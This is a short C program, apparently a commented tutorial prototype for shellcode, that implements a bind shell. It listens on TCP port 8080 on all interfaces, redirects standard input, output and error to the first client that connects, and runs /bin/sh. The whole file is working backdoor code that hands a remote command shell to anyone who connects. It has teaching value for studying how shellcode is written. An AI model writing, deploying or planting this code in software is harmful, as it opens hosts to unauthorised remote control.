#include<sys/socket.h> 
#include<netinet/in.h>

int main(){

        char * shell[2];             //prep for execve call 

        int server,client;           //file descriptor handles

        struct sockaddr_in serv_addr; //structure to hold IP/port vals 

        /*   1. Build a basic IP socket:  */

        server=socket(2,1,0); //build a local IP socket of type stream
                              //int socket(AF_INET, SOCK_STREAM, defult protocol =0);

        /*   2. Build a sockaddr_in structure with IP address and port: */

        serv_addr.sin_addr.s_addr=0;//set addresses of socket to all local
        serv_addr.sin_port=0x901f;//set port of socket, 8080 here
        serv_addr.sin_family=2; //set native protocol family: IP

        /*   3. Bind the port and IP to the socket: */

        bind(server,(struct sockaddr *)&serv_addr,0x10); //int bind(int sockfd, const
                                              //struct sockaddr *addr,socklen_t addrlen);

        /*   4. Start the socket in listen mode; open the port and wait for a connection:*/

        listen(server,0);

        /*   S. When a connection is made, return a handle to the client:*/

        client=accept(server,0,0);   // int accept(int sockfd, struct sockaddr *addr,
                                     //socklen_t *addrlen);

        /*   6. connect client pipes to stdin,stdout,stderr */

        dup2(client,0);              //connect stdin to client
        dup2(client,1);              //connect stdout to client
        dup2(client,2);              //connect stderr to client

        /*   7. Call normal execve shellcode */
        shell[0]="/bin/sh";          //first argument to execve
        shell[1]=0;                  //terminate array with null
        execve(shell[0],shell,0);    //pop a shell
}
